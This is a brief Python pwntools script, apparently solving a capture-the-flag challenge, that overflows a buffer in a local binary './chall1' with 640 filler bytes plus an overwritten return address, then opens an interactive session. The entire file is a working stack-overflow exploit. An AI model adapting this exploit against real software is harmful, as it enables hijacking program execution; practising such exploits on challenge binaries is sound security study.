from pwn import *

payload = b'a' * 640 + b'\x3F\x86\x04\x08'

io = process('./chall1')
print(io.recvregex(b':')) # read until we get the prompt
io.sendline(payload)
io.interactive()